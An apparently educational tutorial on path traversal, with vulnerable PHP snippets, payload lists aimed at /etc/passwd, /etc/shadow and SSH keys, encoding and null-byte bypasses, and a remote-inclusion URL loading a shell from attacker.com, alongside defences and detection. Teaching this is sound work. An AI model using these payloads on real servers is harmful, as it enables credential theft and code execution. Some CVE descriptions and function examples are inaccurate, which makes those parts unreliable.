### Path Traversal
**Path Traversal** occurs when an attacker manipulates file paths in user inputs to access unauthorized files on the server. By exploiting this vulnerability, attackers can navigate the file system and access sensitive files such as:

- `/etc/passwd` on Unix/Linux
- `C:\\Windows\\System32\\drivers\\etc\\hosts` on Windows

---

## **Key Concepts**

- **Absolute Path**: A full path from the root directory (e.g., `/var/www/html/index.php`).
- **Relative Path**: A path relative to the current directory (e.g., `../etc/passwd`).
- **Traversal Sequences**: Special sequences like `../` or `..\\` (depending on the operating system) that allow navigation to parent directories.

---

## **How Path Traversal Happens**

### **Improper Input Validation**

Applications that allow user input to control file paths without proper validation are vulnerable to path traversal. Common cases include:

1. **File Uploads**:
Users specify the path or filename for an upload.
    
    ```php
    <?php
    $file = $_GET['file'];
    include("/var/www/html/files/" . $file);
    ?>
    
    ```
    
    Here, if `$file` is set to `../../../../etc/passwd`, the server will attempt to include the sensitive `/etc/passwd` file.
    
2. **File Download Scripts**:
Scripts designed to serve files can also be manipulated to serve unintended files.
    
    ```php
    <?php
    $filename = $_GET['file'];
    readfile('/var/www/uploads/' . $filename);
    ?>
    
    ```
    
    In this case, an attacker could pass `../../../../etc/passwd` as a parameter.
    

---

## **Common Path Traversal Payloads**

Attackers use traversal sequences to move up directories and access restricted files. Here are common payloads:

1. **Linux Payloads**:
    - `/etc/passwd`: Obtain user information.
    - `/etc/shadow`: If the application is running with root permissions, the attacker can get password hashes.
    - `/var/log/apache2/access.log`: Obtain access logs, possibly containing sensitive data.
    - `/home/user/.ssh/id_rsa`: Private SSH key files.
    
    Example:
    
    ```
    ../../../../etc/passwd
    ../../../../var/log/apache2/access.log
    
    ```
    
2. **Windows Payloads**:
    - `C:\\Windows\\win.ini`: A file that exists on most Windows systems.
    - `C:\\Windows\\System32\\drivers\\etc\\hosts`: Hosts file that maps IP addresses to hostnames.
    - `C:\\Windows\\repair\\SAM`: Contains encrypted Windows passwords.
    
    Example:
    
    ```
    ..\\..\\..\\..\\Windows\\win.ini
    ..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
    
    ```
    

---

## **Defense Against Path Traversal**

1. **Input Validation**:
    - Use a whitelist of allowed files or directories.
    - Reject filenames with traversal sequences like `../` or `..\\`.
    - Implement strong regular expressions to validate user input.
    
    Example (PHP):
    
    ```php
    if (preg_match('/\\.\\./', $user_input)) {
        die("Invalid input");
    }
    
    ```
    
2. **Use Absolute Paths**:
Avoid using relative paths altogether. Use fixed, absolute paths to the directories or files your application needs access to.
3. **Use Built-in File APIs**:
Functions like `realpath()` in PHP or `canonicalize()` in Java can resolve relative paths to their absolute counterparts, helping avoid directory traversal attacks.
    
    Example (PHP):
    
    ```php
    $file = realpath($file_input);
    if (strpos($file, "/var/www/files/") !== 0) {
        die("Invalid file");
    }
    
    ```
    
4. **Least Privilege Principle**:
Limit the application’s access to the file system. Ensure that the user under which the application runs has restricted permissions, so even if an attacker compromises the system, they can only access files they have permission to.

---

## **Exploitation Scenarios**

### **Example 1: Basic Path Traversal**

An attacker exploits a file download functionality that accepts user input.

```php
<?php
$filename = $_GET['file'];
readfile("/var/www/uploads/" . $filename);
?>

```

Payload:

```
<http://victim.com/download.php?file=../../../../etc/passwd>

```

Result:
The server responds with the contents of `/etc/passwd`.

### **Example 2: Double Encoded Path Traversal**

Some web applications may decode user input multiple times. Attackers can double encode the traversal sequences to bypass input validation.

Payload:

```
<http://victim.com/download.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd>

```

- `%25` is the encoded version of `%`.
- The server decodes this twice, resulting in `../../../../etc/passwd`.

---

## **Advanced Path Traversal Techniques**

### **1. Path Traversal with Null Byte Injection**

In older PHP versions (prior to PHP 5.3.4), null byte injection (`%00`) could be used to terminate file paths early, bypassing extensions or further file validation.

Vulnerable code:

```php
<?php
$filename = $_GET['file'] . ".php";
include("/var/www/html/" . $filename);
?>

```

Payload:

```
<http://victim.com/vulnerable.php?file=../../../../etc/passwd%00>

```

- `%00` acts as a null byte, terminating the string at `passwd`, ignoring the `.php` extension.

### **2. Remote File Inclusion (RFI) via Path Traversal**

Path Traversal can sometimes lead to Remote File Inclusion (RFI) if user-supplied input allows inclusion of files from remote servers.

Vulnerable code:

```php
<?php
$filename = $_GET['file'];
include("/var/www/html/" . $filename);
?>

```

Payload:

```
<http://victim.com/vulnerable.php?file=http://attacker.com/shell.txt>

```

In this case, the attacker can execute arbitrary code by including a remote malicious file.

### **3. Path Traversal via Local File Inclusion (LFI)**

LFI vulnerabilities can also be exploited with Path Traversal to escalate attacks, such as reading sensitive files like configuration or authentication files.

Payload:

```
<http://victim.com/index.php?page=../../../../etc/passwd>

```

In this scenario, the `page` parameter is used to include local files, which leads to directory traversal.

---

## **Detection of Path Traversal Vulnerabilities**

1. **Manual Testing**:
    - Craft traversal payloads like `../`, `../../`, or encoded variations (`%2e%2e%2f`) in parameters and observe server responses.
    - Look for unexpected file content in responses.
2. **Automated Testing Tools**:
    - **Burp Suite**: The Intruder and Scanner features can be used to test for Path Traversal vulnerabilities by fuzzing input parameters.
    - **OWASP ZAP**: Another powerful tool that can automate path traversal detection.
    - **Nmap NSE Scripts**: The Nmap Scripting Engine (NSE) has scripts that can detect basic Path Traversal vulnerabilities in web applications.
3. **Source Code Review**:
    - Look for user input being directly concatenated with file system paths.
    - Check for inadequate or improper input validation.

---

## **Real-world Path Traversal Exploits**

1. **CVE-2021-22986** - F5 BIG-IP iControl REST API:
A Path Traversal vulnerability allowed attackers to access arbitrary files by sending crafted HTTP requests, leading to remote code execution.
2. **CVE-2019-11815** - Linux Kernel Vulnerability:
Path Traversal combined with other local privilege escalation exploits in the Linux kernel.

---

## **Common Functions Prone to Path Traversal Vulnerabilities**

1. **PHP**:
    - `include()`, `require()`, `readfile()`, `file_get_contents()`, `fopen()`
2. **Python**:
    - `open()`, `os.open()`, `os.system()`
3. **Java**:
    - `File()`, `FileReader()`, `BufferedReader()`
